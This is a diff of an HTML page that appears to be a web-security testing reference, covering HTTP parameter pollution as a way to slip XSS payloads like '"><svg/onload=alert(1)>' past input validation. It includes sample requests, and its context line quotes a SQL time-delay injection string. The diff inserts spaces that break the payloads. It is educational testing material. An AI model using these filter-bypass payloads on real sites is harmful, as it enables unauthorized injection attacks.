@@ -1596,7 +1596,7 @@ pic.png;waitfor delay '0:0:5'--
     </div>
 </div>
 
-        <!-- Parameter Pollution Category -->
+      <!-- Parameter Pollution Category -->
 <div class="category">
     <h3><input type="checkbox" id="parameter-pollution">16 > Parameter Pollution</h3>
     <div class="subcategory">
@@ -1613,7 +1613,7 @@ pic.png;waitfor delay '0:0:5'--
         </p>
 
         <h4>1 - All Occurrences of Specific Parameter</h4>
-        <p>This means that if we parse the same name parameters like <code>q=hello&q=”><svg/onload=alert(1)></code> the check will be performed on both the parameters because they have the same name. In All occurrences, the barrier is if the back-end logic is configured to allow a specific parameter only 1 time then appending another parameter (e.g., <code>q=hello&q=”><svg/onload=alert(1)></code>) of the same name will give you an error.</p>
+        <p>This means that if we parse the same name parameters like <code>q=hello&q=”>< svg/onload=alert(1)></code> the check will be performed on both the parameters because they have the same name. In All occurrences, the barrier is if the back-end logic is configured to allow a specific parameter only 1 time then appending another parameter (e.g., <code>q=hello&q=”>< svg/onload=alert(1)></code>) of the same name will give you an error.</p>
         
         <h5>Request:</h5>
         <pre>
@@ -1661,7 +1661,7 @@ cache-control: no-cache, private
         
         <h5>Request:</h5>
         <pre>
-GET /search?q="><svg/onload=alert(1)> HTTP/1.1
+GET /search?q=">< svg/onload=alert(1)> HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
@@ -1676,7 +1676,7 @@ cache-control: no-cache, private
 
         <h5>HTTP Parameter Pollution Request:</h5>
         <pre>
-GET /search?q=Hello&q="><svg/onload=alert(1)> HTTP/1.1
+GET /search?q=Hello&q=">< svg/onload=alert(1)> HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
@@ -1688,14 +1688,14 @@ server: nginx
 content-type: application/json
 cache-control: no-cache, private
         </pre>
-        <p>In the above mentioned polluted request only the first occurrence (<code>q=Hello</code>) is checked and the last occurrence (<code>q="><svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
+        <p>In the above mentioned polluted request only the first occurrence (<code>q=Hello</code>) is checked and the last occurrence (<code>q=">< svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
 
         <h4>3 - Last Occurrence</h4>
         <p>Last occurrence means a web application performs input validation on the last parameter which makes it vulnerable to the first parameter which should be of the same name.</p>
         
         <h5>Request:</h5>
         <pre>
-GET /search?q="><svg/onload=alert(1)> HTTP/1.1
+GET /search?q=">< svg/onload=alert(1)> HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
@@ -1710,7 +1710,7 @@ cache-control: no-cache, private
 
         <h5>HTTP Parameter Pollution Request:</h5>
         <pre>
-GET /search?q="><svg/onload=alert(1)>&q=Hello HTTP/1.1
+GET /search?q=">< svg/onload=alert(1)>&q=Hello HTTP/1.1
 Host: site.target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
         </pre>
@@ -1722,7 +1722,7 @@ server: nginx
 content-type: application/json
 cache-control: no-cache, private
         </pre>
-        <p>In the above mentioned polluted request only the last occurrence (<code>q=Hello</code>) is checked and the first occurrence (<code>q="><svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
+        <p>In the above mentioned polluted request only the last occurrence (<code>q=Hello</code>) is checked and the first occurrence (<code>q=">< svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
 
         <h4>4 - Becomes an Array</h4>
         <p>Becomes an array means whatever the input is sent from the client side the server parses it into an array and displays it. This means the parameter which you are polluting has an array datatype, which is also the most vulnerable.</p>
@@ -1777,7 +1777,6 @@ cache-control: no-cache, private
         </ul>
     </div>
 </div>
-
 
 
         
